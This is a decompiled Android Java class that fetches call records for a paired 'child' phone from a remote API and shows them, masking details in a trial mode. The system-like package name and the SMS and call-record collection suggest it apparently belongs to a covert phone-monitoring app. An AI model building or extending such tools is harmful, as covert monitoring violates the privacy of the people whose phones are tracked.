package com.android.service.view;

import android.content.Context;
import android.util.Log;
import com.android.service.XmppService;
import com.xmpp.client.util.HttpClinentModle;
import com.xmpp.client.util.PushDialogModle;
import java.util.ArrayList;
import java.util.List;
import java.util.StringTokenizer;
import org.jivesoftware.smackx.packet.IBBExtensions.Data;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class CallRecordDataBean {
    private Context ctx;
    private HttpClinentModle hcm = new HttpClinentModle(this.ctx);
    private List<String> list;
    private List<String> list2;
    private List<String> listtime;
    private PushDialogModle pdm = new PushDialogModle(this.ctx);
    private String strSelect_Pairnum;
    private String strVersion;

    public CallRecordDataBean(Context context, String Version, String Select_Pairnum) {
        this.ctx = context;
        this.strVersion = Version;
        this.strSelect_Pairnum = Select_Pairnum;
    }

    public void UpdataJason(String strHostname) {
        JsonParser(this.hcm.HttpClinentJason("http://" + strHostname + "/API/GetCallRecord.ashx?phonenum=" + this.strSelect_Pairnum));
        CallRecordViewActivity.callrecord_lv.setAdapter(new CallRecordAdapter(this.ctx, this.list, this.list2, this.listtime));
    }

    private void JsonParser(String strJason) {
        this.list = new ArrayList();
        this.list2 = new ArrayList();
        this.listtime = new ArrayList();
        try {
            JSONObject json = new JSONObject(strJason);
            if (json.getString("success").equalsIgnoreCase("true")) {
                String strtime = json.getString("AddTime");
                JSONArray nameList = json.getJSONArray(Data.ELEMENT_NAME);
                CallRecordViewActivity.callrecord_update_time.setText(strtime);
                if (nameList.length() > 0) {
                    for (int i = 0; i < nameList.length(); i++) {
                        String strDataContent = nameList.getJSONObject(i).getString("str").trim();
                        System.out.println("======strDataContent=====" + strDataContent);
                        StringTokenizer st2 = new StringTokenizer(strDataContent, XmppService.strCheckTag);
                        String smssub1 = "";
                        String smssub2 = "";
                        String smssub3 = "";
                        int n = 0;
                        while (st2.hasMoreElements()) {
                            if (n == 0) {
                                smssub1 = st2.nextToken();
                            } else if (n == 1) {
                                smssub2 = st2.nextToken();
                            } else {
                                smssub3 = st2.nextToken();
                            }
                            n++;
                        }
                        if (smssub3 != null && smssub3.length() > 0) {
                            if (this.strVersion.equalsIgnoreCase("1")) {
                                System.out.println("======正式=====");
                                System.out.println("smssub1:" + smssub1);
                                System.out.println("smssub3:" + smssub3);
                                this.list.add(smssub1);
                                this.list2.add(smssub2);
                                this.listtime.add(smssub3);
                            } else {
                                System.out.println("======試用=====");
                                if (!(smssub1 == null || smssub2 == null || smssub3 == null)) {
                                    if (smssub2.indexOf(":") > 1) {
                                        smssub2 = smssub2.replace(smssub2.substring(1, smssub2.indexOf(":")), "xx");
                                    }
                                    if (smssub2.substring(smssub2.indexOf(":"), smssub2.length()).length() > 5) {
                                        smssub2 = smssub2.replace(smssub2.substring(5, smssub2.length()), "xxxxx");
                                    } else {
                                        smssub2 = smssub2.replace(smssub2.substring(smssub2.indexOf(":") + 2, smssub2.length()), "xxxxx");
                                    }
                                    if (smssub3.length() > 7) {
                                        smssub3 = smssub3.replace(smssub3.substring(7, smssub3.length()), "-xx xx:xx:xx");
                                    } else {
                                        smssub3 = smssub3.replace(smssub3, "xxxxx");
                                    }
                                }
                                this.list.add(smssub1);
                                this.list2.add(smssub2);
                                this.listtime.add(smssub3);
                            }
                        }
                    }
                    return;
                }
                this.pdm.PushAlertSingleButton("訊息通知", "子機目前無簡訊資料!!");
                return;
            }
            this.pdm.PushAlertSingleButton("伺服器訊息", json.getString("reason"));
        } catch (JSONException e) {
            this.pdm.PushAlertSingleButton("系統出錯", new StringBuilder(String.valueOf(strJason)).append(this.strSelect_Pairnum).append(":").append(Log.getStackTraceString(e)).toString());
        } catch (Exception e2) {
            this.pdm.PushAlertSingleButton("系統出錯", new StringBuilder(String.valueOf(strJason)).append(this.strSelect_Pairnum).append(":").append(Log.getStackTraceString(e2)).toString());
        }
    }
}
